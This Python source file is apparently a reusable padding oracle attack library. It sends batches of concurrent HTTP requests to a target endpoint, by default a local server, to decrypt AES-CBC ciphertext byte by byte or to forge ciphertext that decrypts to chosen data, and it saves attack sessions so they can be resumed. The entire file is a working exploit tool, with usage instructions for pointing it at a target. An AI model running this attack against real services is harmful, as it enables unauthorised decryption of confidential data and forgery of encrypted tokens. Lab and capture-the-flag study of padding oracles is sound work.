from Crypto.Util.Padding import pad
import time
from grequests import request
import grequests
from requests import Response, Request, get
import os, sys, abc
import json

class payload_model(object):
    """
    a library for padding oracle attack

    payload_model is a abstract class handling all details of attack algorithm\n
    you should specify a subclass of payload_model and change some import methods

    basic usge
    ---
    ```python
    from padding_oracle_attack import payload_model
    import grequests

    def make_request(self, fake_data) -> request:
        params = {
                "data": bytes.hex(fake_data)
            }

        return request("get", "http://127.0.0.1:5000", params=params)

    if __name__ == "__main__":
        m = payload("3a10f84900818b1c439430600524fb0f00000000000000000000000000000000", fake=True)
        m.run()
    ```

    """
    def __init__(self, data="", fake=False):
        """
        :param data fake data or encryted data\n
        :param fake to forge data or get plain data
        """
        self.data = self.pre_handle(data)
        self.fake = fake

        if fake:
            self.data = pad(self.data, 16)

        self.block_len = len(self.data) // 16

        self.data_block = []
        for i in range(self.block_len):
            self.data_block.append(self.data[16 * i:16 * i + 16])

        self.decrypt_block = [b""] * self.block_len
        if not fake:
            self.decrypt_block[0] = self.data_block[0]

        self.encrypt_block = [b""] * (self.block_len + 1)
        self.encrypt_block[-1] = b"\xaa" * 16


        self.block = self.block_len - 1

        self.byte = 15

    def xor(self, data1:bytes, data2:bytes):
        return b"".join(int.to_bytes(x ^ y, byteorder="little", length=1)  for x, y in zip([i for i in data1], [j for j in data2]))

    def pre_handle(self, data) -> bytes:
        return bytes.fromhex(data)

    def padding_ok(self, resp:Response) -> bool:
        """judge if resp is successful\n
        :param resp: the response of resquest\n
        :rtype: boolean
        """
        if resp.status_code == 200:
            return True
        else:
            return False

    def recover_fake_data(self, req:Request, fake_datas):
        for fake_data in fake_datas:
            if bytes.hex(fake_data) in req.url:
                return fake_data
        return None

    def make_request(self, fake_data) -> request:
        """make request\n
        :param fake_data: the list containing fake data\n
        :rtype: request
        """
        params = {
                "data": bytes.hex(fake_data)
            }

        return request("get", "http://127.0.0.1:5000", params=params)


    def attack(self, fake_datas):
        fake_data = None

        reqs = []
        for data in fake_datas:
            reqs.append(self.make_request(data))

        for resp in grequests.map(reqs):
            if self.padding_ok(resp):
                fake_data = self.recover_fake_data(resp.request, fake_datas)
                break

        if fake_data:
            if self.fake:
                self.decrypt_block[self.block] = int.to_bytes(fake_data[self.byte] ^ (16 - self.byte), byteorder="little", length=1) + self.decrypt_block[self.block]
                self.encrypt_block[self.block] = int.to_bytes(fake_data[self.byte] ^ (16 - self.byte) ^ self.data_block[self.block][self.byte], byteorder="little", length=1) + self.encrypt_block[self.block]
            else:
                self.decrypt_block[self.block] = int.to_bytes(fake_data[self.byte] ^ (16 - self.byte), byteorder="little", length=1) + self.decrypt_block[self.block]
            return True
        else:
            return False

    def print_hex(self, data:bytes, color=False) -> str:
        if color:
            return "".join("\033[1;32m%02x\033[0m " % x for x in data)
        return "".join("\033[1;2m%02x\033[0m " % x for x in data)

    def run(self):
        data = self.print_hex(self.data)
        print(data)

        if self.fake:
            new_data = self.print_hex(b"".join([b"\x00" * 16] * (len(self.encrypt_block) - 1)))
            new_data = "\033[?25l\033[s" + new_data + "\033[1;32m00\033[0m " * 16
        else:
            new_data = self.print_hex(b"".join([b"\x00" * 16] * (len(self.decrypt_block) - 1)))
            new_data = "\033[?25l\033[s" + new_data
        print("\033[s" + new_data)
        sys.stdout.flush()
            
        error_times = 0
        while (self.block >= 0 and self.fake) or (self.block >= 1 and not self.fake):
            try:
                # print(self.decrypt_block)
                sure_data = b""

                if 16 - self.byte - 1 != 0:
                    sure_data =  self.xor(int.to_bytes(16 - self.byte, byteorder="little", length=1) * (16 - self.byte - 1), self.decrypt_block[self.block])

                fake_data = b"\x00" * (self.byte+1) + sure_data

                fake_datas = []
                for i in range(256):
                    new_fake_data = fake_data[:self.byte] + int.to_bytes(i, byteorder="little", length=1) + fake_data[self.byte+1:]
                    if self.fake:
                        fake_datas.append(new_fake_data + self.encrypt_block[self.block + 1])
                    else:
                        fake_datas.append(new_fake_data + self.data_block[self.block])

                #handle situation when retry too many times
                if not self.attack(fake_datas):
                    if error_times < 10:
                        print("retry %d times..." % error_times, end="\r")
                        error_times += 1
                    else:
                        error_times = 0
                        self.decrypt_block[self.block] = b""
                        self.encrypt_block[self.block] = b""
                        self.byte = 15
                    continue

                
                if self.fake:
                    new_data = self.print_hex((b"".join([b"\x00" * 16] * self.block) + b"\x00" * (16 - len(self.encrypt_block[self.block]))))
                    new_data += self.print_hex(self.encrypt_block[self.block], color=True)
                else:
                    new_data = self.print_hex(b"\x00" * (16 - len(self.decrypt_block[self.block]) + 16 * (self.block - 1))) + \
                        self.print_hex(self.decrypt_block[self.block], color=True)
                        
                sys.stdout.write("\033[u" + new_data)
                sys.stdout.flush()

                if self.byte == 0:
                    self.block -= 1
                    self.byte = 15
                else:
                    self.byte -= 1

            #when you stop attack, it save session to file padding-session.txt and print session.
            except KeyboardInterrupt:
                dump = self.dump()
                print(dump)
                with open("padding-session.txt", "w") as f:
                    f.write(dump)
                os._exit(-1)

        if self.fake:
            data = b"".join(self.encrypt_block)
            print("\nfake_data: ", end="")
            print(bytes.hex(data))
        else:
            data = b""
            for i, j in zip(self.decrypt_block[1:], self.data_block):
                data += self.xor(i, j)
            print("\norgin_data: " + data.decode())

        resp = grequests.map([self.make_request(data)])[0]
        print("content: " + resp.text)
            
    def dump(self) -> str:
        return json.dumps(
            {
            "data": bytes.hex(self.data),
            "fake": self.fake,
            "block_len": self.block_len,
            "data_block": [bytes.hex(x) for x in self.data_block],
            "decrypt_block": [bytes.hex(x) for x in self.decrypt_block],
            "encrypt_block": [bytes.hex(x) for x in self.encrypt_block],
            "block": self.block,
            "byte": self.byte 
            })
    
    def load(self):
        data = ""
        with open("padding-session.txt") as f:
            data = json.loads(f.read())
        self.data = bytes.fromhex(data["data"])
        self.fake = data["fake"] 
        self.block_len = data["block_len"]
        self.data_block = [bytes.fromhex(x) for x in data["data_block"]]
        self.decrypt_block = [bytes.fromhex(x) for x in data["decrypt_block"]]
        self.encrypt_block = [bytes.fromhex(x) for x in data["encrypt_block"]]
        self.block = data["block"]
        self.byte = data["byte"]


if __name__ == "__main__":
    model = payload_model("3a10f84900818b1c439430600524fb0f" * 100, fake=True)
    model.run()